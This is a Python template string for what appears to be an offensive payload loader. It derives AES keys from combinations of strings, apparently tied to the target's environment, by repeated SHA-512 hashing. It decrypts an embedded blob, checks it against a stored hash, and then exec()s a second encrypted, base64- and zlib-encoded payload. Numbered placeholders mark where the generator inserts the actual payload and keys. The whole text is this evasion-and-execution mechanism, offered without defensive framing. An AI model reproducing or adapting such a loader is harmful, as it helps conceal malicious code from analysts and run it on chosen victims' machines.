buildcode = """import os
import hashlib
import sys
import struct
import base64
import zlib
import subprocess
import ctypes
from Crypto.Cipher import AES
from Crypto import Random


class build_code():
    def __init__(self, lookup_table, payload_hash, minus_bytes, key_combos, key_iterations):
        self.lookup_table = lookup_table
        self.iv = self.lookup_table[0:16]
        self.encrypted_msg = self.lookup_table[16:]
        self.payload_hash = payload_hash
        self.key_combos = key_combos
        self.key_iterations = key_iterations
        self.payload = ''
        self.check = False
        self.minus_bytes = int(minus_bytes)

    def check_hash(self):
        # Check the final payload hash - minus_bytes before execution

        if hashlib.sha512(self.payload[:-self.minus_bytes]).hexdigest() == self.payload_hash:
            self.check = True
            print("[*] Hashes are equal!")
            return True
        else:
            return False

    def search(self):
        
        key_list = []
        another_temp = []
        
        # Iterate through all the keys and assemble possible keys

        for item in self.key_combos:

            if type(item) == str:
                
                if key_list == []:
                    key_list.append(item)
                
                else:
                    another_temp = []
                    for value in key_list:
                        another_temp.append(value + item)

                    key_list = another_temp

            elif type(item) == list:

                if key_list == []:
                    for astring in item:
                        key_list.append(astring)
                
                else:
                    another_temp = []
                    for sub_count, _item in enumerate(item):
                        for astring in key_list:
                            another_temp.append(astring + _item)
            
                    key_list = another_temp

        
        
        for keyvalue in key_list:
            print "=" * 50
            print("[*] Key source string", keyvalue)
            key_iterations = self.key_iterations
            
            print("[*] Key iterations:", key_iterations)
        
            # iterate key
            while key_iterations > 1:
                keyvalue = hashlib.sha512(keyvalue).digest()
                key_iterations -= 1
            
            keyvalue = hashlib.sha512(keyvalue).digest()[:32]
            print("Encryption Key: ", keyvalue.encode('hex'))
            self.cipher = AES.new(keyvalue, AES.MODE_CFB, self.iv)
            self.payload = self.cipher.decrypt(self.encrypted_msg)
            if self.check_hash() is True:
                self.execute_code()

    def execute_code(self):
        # decrypt code with the same key

        exec(self.cipher.decrypt(zlib.decompress(base64.b64decode("{3}"))))
        

    def run(self):
        self.search()
        

{5}


def main():
    lookup_table = zlib.decompress(base64.b64decode("{0}"))
    payload_hash = "{1}"
    minus_bytes = "{2}"
    scan_dir = r"{4}"
    key_combos = list()
    key_iterations = int("{7}")

    {6}


    
if __name__ == "__main__":
    main()
"""
